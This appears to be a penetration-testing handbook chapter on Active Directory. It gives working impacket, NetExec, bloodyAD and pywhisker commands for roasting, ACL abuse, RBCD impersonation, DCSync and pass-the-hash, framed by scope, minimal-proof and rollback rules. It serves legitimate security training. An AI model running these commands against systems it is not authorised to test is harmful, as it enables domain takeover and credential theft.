# 08 · Active Directory

AD is an **evidence loop**, not a linear script: establish scope and identity, discover per protocol,
earn one credential, enumerate natively, form a graph hypothesis, **validate the exact edge**, take
the minimum authorised proof, then refresh the token/ticket and re-enumerate. Think in **identities
and edges**, and treat every BloodHound path as a hypothesis until a native read confirms the exact
right on the exact object.

Default success is a **minimum scoped identity/right/access proof** — not a domain-wide shell, a
durable forged ticket, a bulk secret dump, or a new persistent account. Every directory change
captures original state first and restores exactly what it changed.

**Boundary / routes:** password cracking, spraying, and hash/ticket reuse → [§04](04-password-attacks.md);
pivoting and lateral movement → [§07](07-pivoting-and-tunneling.md); tool/artifact transfer →
[§09](09-file-transfers.md); post-exploitation loot and credential collection → bounded
[§10](10-post-exploitation-and-loot.md). **Excluded from this chapter:** LLMNR/NBT-NS poisoning,
Responder/relay, forced authentication and spoofing; golden-ticket and other durable persistence;
indiscriminate DCSync/`krbtgt` collection; log/monitoring evasion.

Placeholders: `DOMAIN_FQDN`, `NETBIOS_DOMAIN`, `REALM`, `DC_FQDN`, `DC_IP`, `PDC_FQDN`,
`CONTROLLED_PRINCIPAL` (a principal you already own), `TARGET_PRINCIPAL`, `TARGET_GROUP`,
`TARGET_COMPUTER`, `TARGET_SPN`, `ATTACKER_IP`, `<artifact>`. Commands are shown **from Linux/Kali**
and, where the memory cue is Windows, **from a Windows shell**; pick the one matching your foothold.

**Jump:** [scope/loop](#81-scope-identity-and-the-evidence-loop) ·
[Kerberos preflight](#82-dns-realm-dc-and-kerberos-time-preflight) ·
[unauth discovery](#83-unauthenticated-protocol-specific-discovery) ·
[policy/first cred](#84-policy-gate-and-first-credential-leads) · [AS-REP](#85-as-rep-roasting) ·
[native enum](#86-credentialed-native-enumeration) · [BH collection](#87-bloodhound-collection) ·
[BH analysis](#88-bloodhound-analysis-and-edge-validation) · [Kerberoast](#89-kerberoasting) ·
[ACL router](#810-acl-preflight-and-target-type-router) · [group](#811-group-targets) ·
[user](#812-user-targets) · [computer/delegation](#813-computer-accounts-and-delegation) ·
[LAPS](#814-laps) · [trusts](#815-trusts-and-cross-domain-context) ·
[GPO/OU](#816-gpo-ou-and-domain-object-paths) · [DCSync](#817-dcsync-and-replication-right-proof) ·
[ticket refresh](#818-token-ticket-and-session-refresh) ·
[access/routes](#819-access-and-companion-routes) · [verify/cleanup](#820-verify-clean-up-and-re-enumerate).

## 8.1 Scope, identity, and the evidence loop

Before any AD interaction, record written scope (in-scope domains/DCs/hosts and which activity
classes — active auth, credential testing, directory mutation, secret access, remote execution — are
allowed) and your current context.

```bash
# From a Linux foothold / Kali:
id; hostname; cat /etc/resolv.conf
nslookup -type=SRV _ldap._tcp.dc._msdcs.DOMAIN_FQDN DC_IP   # locate DCs
```

```powershell
# From a domain-joined Windows shell:
whoami /all
$env:USERDNSDOMAIN; $env:LOGONSERVER
nltest /dsgetdc:DOMAIN_FQDN
```

Keep an **evidence ledger**: for each finding record source, timestamp, confidence, and a next/stop/
revisit decision. The controller for the whole chapter is [§8.20](#820-verify-clean-up-and-re-enumerate):
after every credential, membership, ticket, shell, or route change, re-run the smallest relevant
checks from the new identity. A tool exit code or a graph edge is never proof by itself.

## 8.2 DNS, realm, DC, and Kerberos time preflight

Kerberos needs correct name resolution and a small clock skew. Treat this as a **diagnostic** — measure
first, change local state only if a prerequisite fails, and record the rollback.

```bash
# Measure before changing anything:
nslookup DC_FQDN DC_IP           # forward/reverse resolution through the intended DC
ntpdate -q DC_IP                 # observe offset (query only)

# Only if resolution/skew actually blocks Kerberos, apply a reversible local fix:
sudo sh -c 'echo "DC_IP DC_FQDN DOMAIN_FQDN" >> /etc/hosts'   # note it; remove afterwards
sudo ntpdate DC_IP               # or faketime for a single command; record prior state
```

Success is a non-mutating Kerberos request reaching the expected KDC. **Corrections:** do not
generalise "Kerberos hates bare IPs" into always editing `/etc/hosts`; add only the entries you
need and remove them in cleanup. `ntpdate` may be absent on modern distros (`chrony`/`faketime` are
alternatives). Restore any hosts/time change and record it in the ledger.

## 8.3 Unauthenticated protocol-specific discovery

Each protocol has its **own** anonymous/guest/bind result — keep them separate and record which one
actually worked. None of these is "zero risk"; they still generate authentication and KDC telemetry.

```bash
# SMB null vs guest are different — test both explicitly.
netexec smb DC_IP -u '' -p '' --shares
netexec smb DC_IP -u guest -p '' --shares
netexec smb DC_IP -u guest -p '' --rid-brute      # RID cycling → user list (if guest allowed)

# RPC and anonymous LDAP.
rpcclient -U "" -N DC_IP -c 'enumdomusers;querydispinfo'   # descriptions may hold planted creds
ldapsearch -x -H ldap://DC_IP -b "DC=$(echo DOMAIN_FQDN|sed 's/\./,DC=/g')" sAMAccountName

# Kerberos username validation (enumeration mode ≠ password guessing).
kerbrute userenum -d DOMAIN_FQDN --dc DC_IP users.txt
```

**Correction:** `kerbrute userenum` is username enumeration, **not** a password guess — but it still
creates KDC pre-auth events and needs correct mode, bounded rate, scope, and a stop condition. Do not
label it "no lockout risk." Record for each source the actual response category and provenance; a
username is a candidate, not a credential. **Excluded:** LLMNR/NBT-NS poisoning and Responder are out
of scope for this chapter (spoofing is prohibited in this workflow); passive packet observation is not
poisoning and belongs to [§01](01-recon-and-enumeration.md).

## 8.4 Policy gate and first-credential leads

### Password policy must precede any testing

```bash
netexec smb DC_IP -u '' -p '' --pass-pol           # default domain policy
# authenticated, if you have any credential, also check fine-grained (FGPP)/resultant policy:
netexec ldap DC_IP -u USER -p 'PASS' -M maq
ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN_FQDN' -w 'PASS' \
  -b "DC=..." "(objectClass=msDS-PasswordSettings)"
```

Record lockout threshold/duration/observation window, **fine-grained and resultant** policy, current
bad-password state, and protected/excluded accounts **before** any spray. **Password spraying,
cracking, and credential/hash reuse are routed to [§04](04-password-attacks.md)** behind this policy
gate and explicit authorisation — one weak password across a *bounded* confirmed-user set, never a
Cartesian product, and stop on the first success or any lockout signal. `--local-auth` changes the
identity scope but does **not** remove lockout risk, and a local built-in Administrator is not the
domain Administrator.

### First-credential leads (discovery only)

```bash
# Readable shares, especially SYSVOL/NETLOGON scripts and legacy GPP artifacts.
netexec smb DC_IP -u USER -p 'PASS' --shares
netexec smb DC_IP -u USER -p 'PASS' -M spider_plus
manspider DOMAIN_FQDN -u USER -p 'PASS'            # or scoped smbclient by share
```

Treat a filename or a `description` containing "pass" as a **lead**, not a credential. Record source
path, owner, and timestamp; route parsing/validation/cracking to [§04](04-password-attacks.md) and
never copy a secret value into notes. A recovered credential is validated **narrowly** against its
mapped service before any reuse.

## 8.5 AS-REP roasting

**Context:** accounts with Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH`) yield an AS-REP
you can test offline — no credential required, only a confirmed username.

```bash
impacket-GetNPUsers DOMAIN_FQDN/ -no-pass -usersfile users.txt \
  -format hashcat -outputfile asrep.hash
# hash handling/cracking is §04:
hashcat -m 18200 asrep.hash <wordlist>             # → §04
```

Success is parseable AS-REP material for the intended realm/user; **no roastable account is a valid
negative result**, not a failure. Keep AS-REP eligibility, the request, and offline validation
distinct — do not call every result a usable credential, and select the offline mode from the actual
encryption type. Delete `asrep.hash` and any derived secret when done. (Toggling a *target's* pre-auth
flag via an ACL edge is a directory mutation — see [§8.12](#812-user-targets).)

## 8.6 Credentialed native enumeration

With a first credential, build the map natively **before** graphing. Separate directory-only queries
from host-contact (sessions/shares/admin) checks, and keep a manual/LDAP fallback for when a
collector is unavailable or version-mismatched.

```bash
# Directory-only inventory (Linux):
netexec ldap DC_IP -u USER -p 'PASS' --users --groups --computers
netexec smb  DC_IP -u USER -p 'PASS' --users --groups --pass-pol
ldapsearch -x -H ldap://DC_IP -D 'USER@DOMAIN_FQDN' -w 'PASS' -b "DC=..." \
  "(objectClass=user)" sAMAccountName description memberOf
```

```powershell
# Native from Windows (no module transfer needed):
Get-ADUser -Filter * -Properties description | Select sAMAccountName,description
Get-ADGroupMember "Domain Admins"
# PowerView equivalents when the AD module is absent:
Get-DomainUser -Properties samaccountname,description
Get-DomainComputer -Properties dnshostname,operatingsystem
```

Success is named objects with SID/DN and exact attributes; distinguish **empty output** from a tool/
module failure. Route service accounts to [§8.9](#89-kerberoasting), objects/rights to
[§8.10](#810-acl-preflight-and-target-type-router), and hosts to remote-access mapping
([§8.19](#819-access-and-companion-routes)). Remove any module/script you transferred.

## 8.7 BloodHound collection

Collect the **minimum** graph data for the active hypothesis; blanket `-c All` is not the default.

```bash
bloodhound-python -u USER -p 'PASS' -d DOMAIN_FQDN -ns DC_IP -c DCOnly   # LDAP-only first
# add Session/LocalAdmin methods only when justified and authorised:
bloodhound-python -u USER -p 'PASS' -d DOMAIN_FQDN -ns DC_IP -c DCOnly,Session
```

Record the **collector/ingestor/schema version**, the exact methods that actually ran, the domain/host
scope, object counts, and failures. Session and logged-on-user data is privacy-sensitive and time-
sensitive — a session is not proof recoverable credentials exist. **Cleanup:** remove the collector
and archive from the target/managed host and treat the local graph data as sensitive. Method
semantics and the ingest schema are version-dependent — mark unverified forms `NEEDS-REVIEW`.

## 8.8 BloodHound analysis and edge validation

Mark owned nodes deliberately (record *how/when* ownership was proven), note dataset age, then treat
every path as a hypothesis.

```cypher
// owned → high value: a hypothesis, not a route
MATCH p=shortestPath((n {owned:true})-[*1..]->(g:Group {name:'DOMAIN ADMINS@DOMAIN_FQDN'})) RETURN p
MATCH (u:User {hasspn:true}) RETURN u                    // Kerberoastable candidates
MATCH (u:User {dontreqpreauth:true}) RETURN u            // AS-REP candidates
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c
MATCH (n)-[:GetChanges]->(d:Domain),(n)-[:GetChangesAll]->(d) RETURN n   // DCSync candidates
MATCH (u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO) RETURN u,g
```

**Before acting on any edge**, validate it natively: resolve the source SID, the exact ACE/right, the
target DN/SID/**type**, inheritance/deny/protection and current owner ([§8.10](#810-acl-preflight-and-target-type-router)).
A shortest path alone is not success, and the graph reflects the dataset's age, not live state.
(Terminology: the query language is **Cypher**; BloodHound edge labels are schema-version specific.)

## 8.9 Kerberoasting

**Context:** any authenticated user can request a service ticket for an account with an SPN and test
it offline. Map account → SPN → service host first; not every `svc_` account is privileged or weak.

```bash
impacket-GetUserSPNs DOMAIN_FQDN/USER:'PASS' -dc-ip DC_IP -request -outputfile kerb.hash
# offline handling/cracking is §04; pick the mode from the actual encryption type:
hashcat -m 13100 kerb.hash <wordlist>              # RC4; use -m 19700 for AES → §04
```

Success is a ticket for the **intended** SPN/account; a recovered secret is validated narrowly on its
mapped service, not assumed privileged or sprayed. **Correction:** a service ticket is not universally
"encrypted with the account's NTLM hash" — modern accounts may use AES long-term keys, so select the
offline mode from the real encryption type. Normal Kerberoast (requesting existing SPNs) is distinct
from **targeted** Kerberoast (writing a temporary SPN onto a user you control via an ACL edge), which
is a directory mutation in [§8.12](#812-user-targets). Purge ticket/hash files.

## 8.10 ACL preflight and target-type router

An ACL edge is only actionable once you confirm the **effective right** for **your** principal on a
specific **target type**. The rights are not interchangeable.

```powershell
# Validate the exact edge natively (Windows/PowerView):
Get-DomainObjectAcl -Identity TARGET_PRINCIPAL -ResolveGUIDs |
  ? { $_.SecurityIdentifier -eq (Get-DomainUser CONTROLLED_PRINCIPAL).objectsid }
```
```bash
# From Linux:
dacledit.py -action read -target TARGET_PRINCIPAL DOMAIN_FQDN/USER:'PASS'   # impacket
```

| Target type | Rights needing separate interpretation | Action → required rollback |
|---|---|---|
| **Group** | GenericAll/GenericWrite or member-property write; WriteDACL/WriteOwner are *preparatory* | add one member → remove it, refresh token, verify nested access gone ([§8.11](#811-group-targets)) |
| **User** | GenericAll/GenericWrite, SPN write, UAC/pre-auth write, ForceChangePassword, key-credential write | reversible attr change vs disruptive reset; restore exact value ([§8.12](#812-user-targets)) |
| **Computer** | GenericAll/GenericWrite, delegation/key-credential property write | RBCD/shadow-cred with exact descriptor rollback ([§8.13](#813-computer-accounts-and-delegation)) |
| **GPO/OU** | link, GPO edit, create-child, WriteDACL/owner | high-impact — backup/window/rollback ([§8.16](#816-gpo-ou-and-domain-object-paths)) |
| **Domain** | replication extended rights, WriteDACL/owner | DCSync minimum proof only ([§8.17](#817-dcsync-and-replication-right-proof)) |

**Corrections:** GenericWrite, GenericAll, WriteDACL, WriteOwner, ForceChangePassword and AddMember
are **not** collapsible — WriteDACL/WriteOwner typically only *prepare* an ACL change, they do not
directly perform every listed action. Resolve nested membership, inheritance, deny ACEs and protected
objects with a native read; do not filter composite rights by string equality alone. Snapshot the
full before-state at the same time as planning the change.

## 8.11 Group targets

**Context:** an effective member-write/GenericWrite edge on a group. Capture current membership first.

```bash
# baseline membership, add one member, then remove it in cleanup
netexec ldap DC_IP -u USER -p 'PASS' --query "(cn=TARGET_GROUP)" member
bloodyAD -d DOMAIN_FQDN -u USER -p 'PASS' --host DC_IP add groupMember 'TARGET_GROUP' CONTROLLED_PRINCIPAL
# ... prove intended access via a refreshed session, then:
bloodyAD -d DOMAIN_FQDN -u USER -p 'PASS' --host DC_IP remove groupMember 'TARGET_GROUP' CONTROLLED_PRINCIPAL
```
```powershell
Add-DomainGroupMember -Identity 'TARGET_GROUP' -Members CONTROLLED_PRINCIPAL   # PowerView
```

**Success requires a token refresh:** a new membership is not in your existing ticket/token — re-logon,
open a new session, or request a fresh ticket ([§8.18](#818-token-ticket-and-session-refresh)) before
concluding it worked. Cleanup removes **only** the member you added; then verify the original
membership and that the nested access is gone.

## 8.12 User targets

An edge on a user offers several **different** primitives with different prerequisites and rollback.
Snapshot the full original attribute state before touching it.

**(a) Targeted Kerberoast (temporary SPN):**
```bash
# capture existing SPNs first; insert one collision-checked value; roast; restore exactly
bloodyAD -d DOMAIN_FQDN -u USER -p 'PASS' --host DC_IP set object TARGET_PRINCIPAL servicePrincipalName -v 'fake/oscp'
impacket-GetUserSPNs DOMAIN_FQDN/USER:'PASS' -request-user TARGET_PRINCIPAL -outputfile k.hash   # → §04
bloodyAD -d DOMAIN_FQDN -u USER -p 'PASS' --host DC_IP remove object TARGET_PRINCIPAL servicePrincipalName -v 'fake/oscp'
```

**(b) Pre-auth toggle (AS-REP):** restore the exact UAC state afterwards.
```bash
bloodyAD -d DOMAIN_FQDN -u USER -p 'PASS' --host DC_IP add uac TARGET_PRINCIPAL -f DONT_REQ_PREAUTH
impacket-GetNPUsers DOMAIN_FQDN/TARGET_PRINCIPAL -no-pass -format hashcat -outputfile asrep.hash   # → §04
bloodyAD -d DOMAIN_FQDN -u USER -p 'PASS' --host DC_IP remove uac TARGET_PRINCIPAL -f DONT_REQ_PREAUTH
```

**(c) Shadow credentials** — *gated*: needs an effective write to `msDS-KeyCredentialLink`, a working
KDC PKINIT / AD CS path, clock/DNS, and value-specific cleanup. Adding a key does **not** itself
authenticate or recover an NT secret.
```bash
pywhisker -d DOMAIN_FQDN -u USER -p 'PASS' --target TARGET_PRINCIPAL --action add --dc-ip DC_IP
# → use the PFX via PKINIT to request a TGT (§04 handles key/ticket material), then remove by device-id:
pywhisker -d DOMAIN_FQDN -u USER -p 'PASS' --target TARGET_PRINCIPAL --action remove --device-id <GUID> --dc-ip DC_IP
```

**(d) ForceChangePassword** — *disruptive/usually irreversible*: the original password cannot be
restored. Requires explicit owner approval, dependency/service check, and an immediate owner-led
rotation plan; in a disposable lab reset to a documented baseline. This is a **stop-and-confirm**
action, not a casual alternative.

**Excluded:** the logon-script (`scriptPath`) write is user-triggered execution/persistence and is out
of scope here. Restore every exact multivalue attribute/UAC bit and verify replication; keep cracking
in [§04](04-password-attacks.md).

## 8.13 Computer accounts and delegation

### Delegation inventory (read-only)

```powershell
Get-DomainComputer -Unconstrained | Select dnshostname
Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select dnshostname,msds-allowedtodelegateto
```

Classify unconstrained vs constrained vs protocol-transition vs RBCD as **different** states; discovery
is not impersonation. Route operational abuse of conventional delegation to a controlled card; the
common OSCP case is RBCD below.

### Resource-based constrained delegation (RBCD)

**Context:** you have write on a target computer's `msDS-AllowedToActOnBehalfOfOtherIdentity`, plus a
principal you control (an existing one, or a new machine account if MachineAccountQuota/creation
permits it — a new computer is **not** always required).

```bash
# capture the target's original attribute FIRST (for exact rollback)
impacket-addcomputer DOMAIN_FQDN/USER:'PASS' -computer-name 'OSCP$' -computer-pass 'Pw' -dc-ip DC_IP  # only if needed
impacket-rbcd DOMAIN_FQDN/USER:'PASS' -delegate-from 'OSCP$' -delegate-to 'TARGET_COMPUTER$' -action write -dc-ip DC_IP
impacket-getST DOMAIN_FQDN/'OSCP$':'Pw' -spn cifs/TARGET_COMPUTER.DOMAIN_FQDN -impersonate Administrator -dc-ip DC_IP
KRB5CCNAME=Administrator@cifs_TARGET_COMPUTER.ccache impacket-psexec -k -no-pass TARGET_COMPUTER.DOMAIN_FQDN  # access → §07
```

Success is a correctly named service ticket the target service accepts — scoped to that service, not
domain-wide. **Corrections:** the S4U output ccache filename is generated by the tool (do not hard-code
it — read it back). Cleanup must restore the target's exact `msDS-AllowedToActOnBehalfOfOtherIdentity`
descriptor, **delete the created computer account**, and purge tickets/ccaches. Confirm DNS/time/SPN
before blaming the attack for a KRB error.

## 8.14 LAPS

**Context:** LAPS randomises local-admin passwords; a delegated reader can retrieve them. Distinguish
**legacy LAPS** (`ms-Mcs-AdmPwd`) from **Windows LAPS** (`msLAPS-Password`/encrypted) by schema.

```powershell
# Discovery: coverage, expiry, and who can read — before reading any secret
Get-DomainObject -Properties ms-mcs-admpwdexpirationtime,dnshostname | ? {$_.'ms-mcs-admpwdexpirationtime'}
Get-DomainObjectAcl -Identity TARGET_COMPUTER -ResolveGUIDs | ? {$_.ObjectAceType -match 'ms-Mcs-AdmPwd'}
```

Prove effective read right and the exact managed host/account **first**; do not bulk-read every
password. Named secret **retrieval/use** is deferred to an authorised credential-handling route
([§04](04-password-attacks.md)/[§10](10-post-exploitation-and-loot.md)) — purge output/history/
clipboard and coordinate rotation if exposure exceeds plan. Never publish a managed password value.

## 8.15 Trusts and cross-domain context

```powershell
Get-DomainTrust                                   # direction, transitivity, type
nltest /domain_trusts /all_trusts
```
```cypher
MATCH p=(n:Domain)-[]->(m:Domain) RETURN p        // BloodHound trust map (hypothesis)
```

Discovery is not authority. Record trust **direction, transitivity, SID filtering, referral and
selective authentication** for each relationship, and always state the current principal and the
target domain/realm on any cross-domain query. A trust edge does not grant automatic transitive
access — cross-domain authentication and any reuse are separately scoped ([§04](04-password-attacks.md)/
[§07](07-pivoting-and-tunneling.md)).

## 8.16 GPO, OU, and domain-object paths

**Context:** a GPO/OU edge (edit a linked GPO, link a GPO, create-child, WriteDACL/owner) can affect
every object in its scope — treat it as **high-impact state change**, not a one-liner.

```cypher
MATCH (u)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl]->(g:GPO) RETURN u,g
MATCH (g:GPO)-[:GpLink]->(ou:OU)-[:Contains*1..]->(c:Computer) WHERE c.name CONTAINS 'DC' RETURN g,c
```

Before any change: enumerate the **blast radius** (linked OUs/objects, inheritance), back up the exact
GPO/link/settings, agree a maintenance window, and know the replication/application delay. Restore the
precise link/setting afterwards. **Correction:** "GenericAll on a GPO = domain takeover" is a shortcut,
not a method — a real change needs scope, backup, propagation awareness and exact rollback. Prefer to
route operational GPO abuse to a controlled high-impact card and keep discovery here.

## 8.17 DCSync and replication-right proof

**Context:** an account with `DS-Replication-Get-Changes` **and** `-Get-Changes-All` on the domain can
replicate secrets. Validate the exact rights and their effective source **before** requesting.

```bash
# Validate rights (native/BloodHound), then take ONE named, approved proof account — not the domain:
impacket-secretsdump DOMAIN_FQDN/USER:'PASS'@DC_IP -just-dc-user TARGET_PRINCIPAL
```

Success is one expected account record returned via replication. **Corrections/boundary:** a BloodHound
edge or a "Domain Admin" label is not itself a licence — confirm the effective ACE. Do **not** default
to full-domain dumping or `-just-dc-user krbtgt`; indiscriminate collection and golden-ticket
persistence are **excluded**. Secret disclosure cannot be undone: minimise, redact logs, route storage/
reuse to bounded [§10](10-post-exploitation-and-loot.md)/[§04](04-password-attacks.md), and coordinate
rotation if live secrets were exposed.

## 8.18 Token, ticket, and session refresh

A directory change often is **not** visible in your current token or ticket cache. State the required
refresh explicitly and make it part of success.

```bash
# Linux/ccache: purge and re-request after a membership/rights change
unset KRB5CCNAME; kdestroy 2>/dev/null
impacket-getTGT DOMAIN_FQDN/USER:'PASS' -dc-ip DC_IP     # fresh TGT reflecting new state
export KRB5CCNAME=USER.ccache
```
```powershell
klist purge ; runas /user:DOMAIN_FQDN\CONTROLLED_PRINCIPAL cmd    # or log off/on for a new token
```

New group membership needs a new logon/token; a new attribute may need replication time; an imported/
issued ticket must be intentionally selected (`KRB5CCNAME`) and later purged. Distinguish **directory
replication delay** from **access-token refresh** — a stale token is not a failed attack. On rollback,
purge imported/issued tickets and verify you are back to the original identity.

## 8.19 Access and companion routes

Selecting an access protocol and spending a credential/hash is **routed**, with fresh scope and
admin/protocol evidence — not sprayed by default.

```bash
evil-winrm -i TARGET_HOST -u USER -p 'PASS'                       # WinRM → §07
impacket-psexec  DOMAIN_FQDN/USER@TARGET_HOST -hashes :<NThash>   # PtH (SYSTEM, noisy) → §07
impacket-wmiexec DOMAIN_FQDN/USER@TARGET_HOST -hashes :<NThash>   # PtH → §07
```

One credential/hash does not authorise subnet-wide reuse; validate one allowlisted host with one
read-only proof, then route lateral movement to [§07](07-pivoting-and-tunneling.md) and local
credential access to bounded [§10](10-post-exploitation-and-loot.md). **Correction:** "quieter/
stealthier" is not an evidence-backed safety property or an authorisation — remove created service/
binary/output artifacts and verify service state.

<details>
<summary>Silver ticket — bounded advanced companion (service-scoped only)</summary>

Given a **verified service-account key**, exact domain SID, exact service SPN and hostname, a silver
ticket authenticates to **that one service** — it is not domain-wide authority or persistence. First
validate the service/account/SPN/DNS and whether an internal-only path needs a routed tunnel
([§07](07-pivoting-and-tunneling.md)). Unset `KRB5CCNAME`, remove ticket files, and restore any
hosts/Kerberos/service change afterwards. **Golden tickets** (krbtgt forgery) are durable persistence
and are **excluded** from this chapter.

</details>

## 8.20 Verify, clean up, and re-enumerate

This is the loop controller — run it after **every** identity/membership/ticket/route change.

```text
1. Success = the minimum scoped proof for the current step (a validated right/identity/access),
   named honestly (a service/host identity is not "domain owned").
2. Restore each mutation from its captured baseline: group member removed, SPN/UAC/key-credential
   value restored exactly, RBCD descriptor restored, created computer deleted, GPO/link restored.
3. Refresh the identity/ticket (§8.18); purge imported/issued tickets and ccaches.
4. Re-query authoritative state to confirm rollback, then re-enumerate the smallest relevant
   share/SPN/ACL/remote-access checks from the new identity.
5. Record the delta and an explicit next / stop / revisit decision in the evidence ledger.
```

Leave nothing behind: no added members, SPNs, UAC bits, key credentials, RBCD descriptors, computer
accounts, GPO edits, tickets, ccaches, collector archives, or secret copies. Route credentials to
[§04](04-password-attacks.md), pivoting to [§07](07-pivoting-and-tunneling.md), transfers to
[§09](09-file-transfers.md), and loot to [§10](10-post-exploitation-and-loot.md).

## References

- BloodHound edge labels, collector methods, and the Cypher **schema** are generation-specific; verify
  against the installed version and mark unverified queries `NEEDS-REVIEW`.
- Tool syntax drifts (NetExec/CME rename, `bloodyAD`, impacket, `pywhisker`/Certipy, PKINITtools) —
  record the tested version; a tool's success marker is not proof of safe scope or admin rights.
- Chapter handoffs are linked inline: recon [§01](01-recon-and-enumeration.md), web
  [§02](02-web-attacks.md), shells [§03](03-shells-and-payloads.md), passwords/cracking
  [§04](04-password-attacks.md), pivoting [§07](07-pivoting-and-tunneling.md), transfers
  [§09](09-file-transfers.md), loot [§10](10-post-exploitation-and-loot.md).
